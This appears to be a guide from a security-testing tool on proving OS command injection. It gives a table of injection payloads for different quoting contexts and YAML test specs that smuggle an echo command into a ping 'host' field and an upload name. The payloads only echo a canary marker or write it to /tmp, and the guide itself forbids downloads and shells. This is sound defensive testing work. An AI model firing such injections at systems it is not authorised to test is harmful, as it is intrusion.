# cmdi: proving OS command injection

## What proves it
A shell runs a command the attacker appended, shown by **output the shell computed**. Echo a
marker that the shell has to build, so a response that merely reflects the input cannot match:
`echo prsec$((6*7))${CANARY.token}` prints `prsec42<token>`, while the request contains the
literal `$((6*7))`.

## Payload
Pick the separator for the context the static analysis described:

| Context | Payload appended to a harmless value |
|---|---|
| unquoted argument | `; echo prsec$((6*7))${CANARY.token}` |
| inside double quotes | `"; echo prsec$((6*7))${CANARY.token}; "` |
| inside single quotes | `'; echo prsec$((6*7))${CANARY.token}; '` |
| substitution allowed | `$(echo prsec$((6*7))${CANARY.token})` |

```yaml
kind: http
hypothesis_id: H7
description: >
  POST /api/diagnostics/ping builds "ping -c 1 " + host and runs it with shell=True. An appended
  echo prints a marker only the shell can compute, and the handler returns the command output.
users:
  alice:
    vars: {username: alice, password: alice-dev-pw}
    login:
      - name: alice_login
        method: POST
        path: /api/login
        json: {username: "${USER.username}", password: "${USER.password}"}
        expect_status: [200]
steps:
  - name: inject
    as: alice
    method: POST
    path: /api/diagnostics/ping
    json: {host: "127.0.0.1; echo prsec$((6*7))${CANARY.token}"}
oracles:
  - type: response_contains
    step: inject
    value: prsec42${CANARY.token}
```

## Blind (output not returned)
Echo the token into a file named after it, then check the file with a `command` oracle (it runs
in the same workbench as the app):

```yaml
kind: http
hypothesis_id: H8
description: >
  The thumbnail job passes the uploaded name to a shell; output is discarded. An appended echo
  writes the canary token to a file that only exists if the shell ran it.
users: {}
steps:
  - name: inject
    method: POST
    path: /api/thumbnails
    json: {name: "a.png; echo ${CANARY.token} > /tmp/prsec-${CANARY.token}"}
oracles:
  - type: command
    run: cat /tmp/prsec-${CANARY.token}
    expect: ${CANARY.token}
```

## Rules
Only `echo` (and the arithmetic above) and a file under `/tmp` named after the token. No other
commands, no downloads, nothing that opens a shell or a connection.
